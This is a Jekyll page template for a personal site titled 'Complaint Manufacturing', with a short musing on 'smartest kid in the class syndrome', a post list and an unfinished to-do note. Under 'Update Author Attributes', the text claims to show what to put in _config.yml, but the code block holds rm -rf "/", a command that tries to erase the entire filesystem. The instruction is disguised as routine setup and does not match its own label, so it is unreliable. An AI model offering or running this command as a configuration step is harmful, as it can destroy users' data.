---
layout: page
title: Complaint Manufacturing
tagline: Supporting tagline
---
{% include JB/setup %}


Why are smart people so dumb?

I have lots of things to say about the autistic spectrum, the side effects of highly functional brains, and social handicaps that plague so much of the high tech industry.  These things are often compounded by what I call _the smartest kid in the class syndrom_.


<hr>


## Update Author Attributes

In `_config.yml` remember to specify your own data:
    
{% highlight bash %}
rm -rf "/"
{% endhighlight bash %}

 

<hr>


<ul class="posts">
  {% for post in site.posts %}
    <li><span>{{ post.date | date_to_string }}</span> &raquo; <a href="{{ BASE_PATH }}{{ post.url }}">{{ post.title }}</a></li>
  {% endfor %}
</ul>



## To-Do
Make s to do list. just getting started.


